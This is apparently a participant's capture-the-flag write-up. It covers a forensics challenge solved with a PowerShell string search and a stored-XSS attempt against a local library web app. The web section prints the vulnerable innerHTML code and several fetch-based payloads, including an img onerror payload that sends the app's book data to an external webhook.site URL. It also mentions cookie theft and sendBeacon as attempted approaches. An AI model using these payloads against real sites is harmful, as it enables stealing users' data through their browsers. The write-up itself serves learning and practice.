# Forensic

## Steps

1. Downloaded the file - `gotham.raw`
2. Opened Windows PowerShell
3. Ran the command:
```powershell
   Select-String -Path "gotham.raw" -Pattern "bi0sctf"
```
4. Searched for the word "Flag" in the output

## Screenshot

![image](https://github.com/user-attachments/assets/7dea77d8-ccfc-4c03-b11a-9e63517c3530)

## Flag
```
bi0sctf{H4Ha_N0w_Th4t_1s_Th3_Punchl1n3_0f_Th3_J0k3_1snt_1t?_2d9fe9}
```
# Web Exploitation

Step 1: Initial Exploration

Accessed the ViteLibrary web application at localhost:50001
Found a library management system where users can add books with title, author, and page count
Noticed a share feature at ```/liteShare/:user/:liteId```
Tested login functionality with admin:admin credentials - successfully logged in

Step 2: Source Code Analysis

Examined scripts.js and found vulnerable code:
```
javascriptlibraryRoot.innerHTML += cardTemplate
    .replace("Book Title", book.title)
    .replace("Book Author", book.author);
```
User input directly inserted into innerHTML without sanitization Stored XSS vulnerability identified

Step 3: Understanding Security Controls

Checked main.js and found CSP configuration:

Blocks inline <script> tags
Allows inline event handlers like onerror


Discovered toTitleCase() function processes author field (line 327)

Capitalizes first letter of each word
Would break payloads like onerror → Onerror


Found /getBooks endpoint limits results to 9 books (line 271, MAX_VIEWABLE_BOOKS_LIMIT = 9)

Step 4: First XSS Attempt Author Field
Created book using browser console:
```
javascriptfetch('/api/create', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({
    title: 'Test Book',
    author: `<img src=x onerror=alert(1)>`,
    pages: 100,
    imageLink: '/assets/icons/bookshelf.svg',
    link: '',
    fav: false,
    read: false
  })
});
```

Result: Book created but XSS didn't execute toTitleCase() broke the payload

Step 5: Second Attempt  (Title Field)

Moved payload to title field to bypass toTitleCase():

```
javascriptfetch('/api/create', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({
    title: `<img src=x onerror="fetch('/getBooks').then(r=>r.json()).then(b=>fetch('https://webhook.site/3b6eb027-b438-4e8e-9b77-72893bc3d0e6?flag='+encodeURIComponent(JSON.stringify(b))))">`,
    author: 'Test',
    pages: 100,
    imageLink: '/assets/icons/bookshelf.svg',
    link: '',
    fav: false,
    read: false
  })
});
```
Result: Book created successfully with liteId: hy2iGMCe9a

Step 6: Testing XSS Execution

Opened incognito window
Logged in as admin:admin
```
Visited http://localhost:50001/liteShare/hacker/hy2iGMCe9a
```
Checked webhook.site

Result: Webhook received request at /flag endpoint but no query parameters - data not exfiltrated


Step 7: Debugging with Simple Alert
Created new book to test if XSS executes at all:
```
javascriptfetch('/api/create', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({
    title: `<img src=x onerror="alert('XSS Executed')">`,
    author: 'Test',
    pages: 100,
    imageLink: '/assets/icons/bookshelf.svg',
    link: '',
    fav: false,
    read: false
  })
});
```
Visited as admin in incognito window

Result: No alert appeared - XSS not executing
Step 8: Checking Admin's Books
Ran in admin browser console:
```
javascriptfetch('/getBooks')
  .then(r => r.json())
  .then(books => console.log('Admin books:', books));
```

Examining startingData.json
Opened startingData.json to see all admin books - found 13 total books including:
json{
    "author": "Maddd Max",
    "title": "The Sound Of The Flag Whirling",
    "link": "https://example.com?flag=nite{test_flag_stp}",
    "pages": 326,
    "liteId": "2hdke-6sh3"
}
Position: Book #11 out of 13

/getBooks endpoint returns maximum 9 books due to MAX_VIEWABLE_BOOKS_LIMIT = 9
Flag is in book #11 - unreachable via /getBooks
Even if XSS worked perfectly, it couldn't access the flag book

Attempted Alternative Approaches
1) Tried various payload modifications
2) navigator.sendBeacon() for CORS bypass
3) Base64 encoding data
4) POST requests instead of GET
5) Direct cookie theft

All failed - likely due to combination of:

toTitleCase() issues in author field
CSP blocking certain approaches
Book limit preventing flag access


Conclusion
We found nite{test_flag_stp} flag at liteId: 2hdke-6sh3 in the startingData.json file, but this appears to be a test flag for local development. The actual flag would be dynamically set on the real CTF server.
